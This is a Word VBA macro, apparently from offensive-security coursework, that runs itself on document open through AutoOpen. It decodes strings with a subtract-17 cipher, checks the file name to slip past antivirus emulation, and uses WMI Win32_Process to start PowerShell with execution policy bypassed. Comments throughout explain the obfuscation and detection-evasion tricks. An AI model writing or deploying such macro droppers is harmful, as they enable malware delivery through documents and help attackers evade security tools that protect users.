Function Blueberry(YoungMoney)
	Blueberry = Chr(YoungMoney - 17)
End Function

Function Strawberries(google)
	Strawberries = Left(google, 3)
End Function

Function Almonds(lol)
	Almonds = Right(lol, Len(lol) - 3)
End Function

'for each iteration, entire encrypted string is sent to Strawberries, it uses Left to fetch the first three characters
'Blueberry treats the three char string as a number, subtracts the ciper value 17
'Almonds function is called inside the loop where the Right function will exclude the first three characters that we just decrypted
Function Nuts(Milk)
	Do
	Oatmilk = Oatmilk + Blueberry(Strawberries(Milk))
	Milk = Almonds(Milk)
	Loop While Len(Milk) > 0
	Nuts = Oatmilk
End Function

Function MyMacro()
	'most antivirus products emulate the execution of a document, they rename it.
	'so we can check the Name property of the ActiveDocument and find it to be anything but runner.doc, we’ll exit to avoid heuristics detection
	If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
		Exit Function
	End If
	Dim Iphone As String
	Dim Water As String
	Iphone = "1291281361181311321211181251250490621181371181160491151381291141321320490621271281290"
	Water = Nuts(Iphone)
	'Tea and Coffee are undefined in this case, which will be null in VBA code
	'note all strings are encrypted with our ciper..
	GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
End Function

Sub AutoOpen()
	Mymacro
End Sub